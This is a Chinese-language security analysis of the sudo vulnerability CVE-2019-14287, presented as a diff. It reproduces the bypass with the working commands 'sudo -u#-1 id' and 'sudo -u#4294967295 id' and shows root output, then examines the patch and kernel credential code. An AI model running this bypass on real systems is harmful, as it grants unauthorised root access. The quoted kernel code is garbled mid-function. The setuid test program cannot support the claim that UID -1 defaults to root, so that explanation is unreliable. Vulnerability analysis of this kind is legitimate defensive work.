@@ -1,0 +1,123 @@
+**作者：lu4nx@知道创宇404积极防御实验室  
+作者博客：[《CVE-2019-14287（Linux sudo
+漏洞）分析》](https://www.shellcodes.org/Hacking/CVE-2019-14287%EF%BC%88Linux%20sudo%E6%BC%8F%E6%B4%9E%EF%BC%89%E5%88%86%E6%9E%90.html
+"CVE-2019-14287（Linux sudo 漏洞）分析")**
+近日 sudo
+被爆光一个漏洞，非授权的特权用户可以绕过限制获得特权。官方的修复公告请见：。
+## 1\. 漏洞复现
+实验环境：
+操作系统 | CentOS Linux release 7.5.1804  
+---|---  
+内核 | 3.10.0-862.14.4.el7.x86_64  
+sudo 版本 | 1.8.19p2  
+首先添加一个系统帐号 test_sudo 作为实验所用：
+    [root@localhost ~] # useradd test_sudo
+然后用 root 身份在 /etc/sudoers 中增加：
+    test_sudo ALL=(ALL,!root) /usr/bin/id
+表示允许 test_sudo 帐号以非 root 外的身份执行 /usr/bin/id，如果试图以 root 帐号运行 id 命令则会被拒绝：
+    [test_sudo@localhost ~] $ sudo id
+    对不起，用户 test_sudo 无权以 root 的身份在 localhost.localdomain 上执行 /bin/id。
+sudo -u 也可以通过指定 UID 的方式来代替用户，当指定的 UID 为 -1 或 4294967295（-1 的补码，其实内部是按无符号整数处理的）
+时，因此可以触发漏洞，绕过上面的限制并以 root 身份执行命令：
+    [test_sudo@localhost ~]$ sudo -u#-1 id
+    uid=0(root) gid=1004(test_sudo) 组=1004(test_sudo) 环境=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+    [test_sudo@localhost ~]$ sudo -u#4294967295 id
+    uid=0(root) gid=1004(test_sudo) 组=1004(test_sudo) 环境=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+## 2\. 漏洞原理分析
+在官方代码仓库找到提交的修复代码：。
+从提交的代码来看，只修改了 lib/util/strtoid.c。strtoid.c 中定义的 sudo_strtoid_v1 函数负责解析参数中指定的
+UID 字符串，补丁关键代码：
+    /* Disallow id -1, which means "no change". */
+    if (!valid_separator(p, ep, sep) || llval == -1 || llval == (id_t)UINT_MAX) {
+      if (errstr != NULL)
+        *errstr = N_("invalid value");
+      errno = EINVAL;
+      goto done;
+     }
+llval 变量为解析后的值，不允许 llval 为 -1 和 UINT_MAX（4294967295）。
+也就是补丁只限制了取值而已，从漏洞行为来看，如果为 -1，最后得到的 UID 却是 0，为什么不能为 -1？当 UID 为 -1
+的时候，发生了什么呢？继续深入分析一下。
+我们先用 strace 跟踪下系统调用看看：
+    [root@localhost ~]# strace -u test_sudo sudo -u#-1 id
+因为 strace -u 参数需要 root 身份才能使用，因此上面命令需要先切换到 root 帐号下，然后用 test_sudo 身份执行了 `sudo
+-u#-1 id` 命令。从输出的系统调用中，注意到：
+    setresuid(-1, -1, -1)                   = 0
+sudo 内部调用了 setresuid 来提升权限（虽然还调用了其他设置组之类的函数，但先不做分析），并且传入的参数都是 -1。
+因此，我们做一个简单的实验来调用 setresuid(-1, -1, -1) ，看看为什么执行后会是 root 身份，代码如下：
+    #include 
+    #include 
+    #include 
+    int main() {
+      setresuid(-1, -1, -1);
+      setuid(0);
+      printf("EUID: %d, UID: %d\n", geteuid(), getuid());
+      return 0;
+    }
+注意，需要将编译后的二进制文件所属用户改为 root，并加上 s 位，当设置了 s 位后，其他帐号执行时就会以文件所属帐号的身份运行。
+为了方便，我直接在 root 帐号下编译，并加 s 位：
+    [root@localhost tmp] # gcc test.c
+    [root@localhost tmp] # chmod +s a.out
+然后以 test_sudo 帐号执行 a.out：
+    [test_sudo@localhost tmp] $ ./a.out
+    EUID: 0, UID: 0
+可见，运行后，当前身份变成了 root。
+其实 setresuid 函数只是系统调用 setresuid32 的简单封装，可以在 GLibc 的源码中看到它的实现：
+    // 文件：sysdeps/unix/sysv/linux/i386/setresuid.c
+    int
+    __setresuid (uid_t ruid, uid_t euid, uid_t suid)
+    {
+      int result;
+      result = INLINE_SETXID_SYSCALL (setresuid32, 3, ruid, euid, suid);
+      return result;
+    }
+setresuid32 最后调用的是内核函数 sys_setresuid，它的实现如下：
+    // 文件：kernel/sys.c
+    SYSCALL_DEFINE3(setresuid, uid_t, ruid, uid_t, euid, uid_t, suid)
+    {
+      ...
+      struct cred *new;
+      ...
+      kruid = make_kuid(ns, ruid);
+      keuid = make_kuid(ns, euid);
+      ksuid = make_kuid(ns, suid);
+      new = prepare_creds();
+      old = current_cred();
+      ...
+      if (ruid != (uid_t) -1) {
+        new->uid = kruid;
+        if (!uid_eq(kruid, old->uid)) {
+          retval = set_user(new);
+          if (retval euid = keuid;
+      if (suid != (uid_t) -1)
+        new->suid = ksuid;
+      new->fsuid = new->euid;
+      ...
+      return commit_creds(new);
+     error:
+      abort_creds(new);
+      return retval;
+    }
+简单来说，内核在处理时，会调用 prepare_creds 函数创建一个新的凭证结构体，而传递给函数的 ruid、euid和suid 三个参数只有在不为
+-1 的时候，才会将 ruid、euid 和 suid 赋值给新的凭证（见上面三个 if 逻辑），否则默认的 UID 就是 0。最后调用
+commit_creds 使凭证生效。这就是为什么传递 -1 时，会拥有 root 权限的原因。
+我们也可以写一段 SystemTap 脚本来观察下从应用层调用 setresuid 并传递 -1 到内核中的状态：
+    # 捕获 setresuid 的系统调用
+    probe syscall.setresuid {
+      printf("exec %s, args: %s\n", execname(), argstr)
+    }
+    # 捕获内核函数 sys_setresuid 接受到的参数
+    probe kernel.function("sys_setresuid").call {
+      printf("(sys_setresuid) arg1: %d, arg2: %d, arg3: %d\n", int_arg(1), int_arg(2), int_arg(3));
+    }
+    # 捕获内核函数 prepare_creds 的返回值
+    probe kernel.function("prepare_creds").return {
+      # 具体数据结构请见 linux/cred.h 中 struct cred 结构体
+      printf("(prepare_cred), uid: %d; euid: %d\n", $return->uid->val, $return->euid->val)
+    }
+然后执行：
+    [root@localhost tmp] # stap test.stp
+接着运行前面我们编译的 a.out，看看 stap 捕获到的：
+    exec a.out, args: -1, -1, -1 # 这里是传递给 setresuid 的 3 个参数
+    (sys_setresuid) arg1: -1, arg2: -1, arg3: -1 # 这里显示最终调用 sys_setresuid 的三个参数
+    (prepare_cred), uid: 1000; euid: 0 # sys_setresuid 调用了 prepare_cred，可看到默认 EUID 是为 0的
+* * *
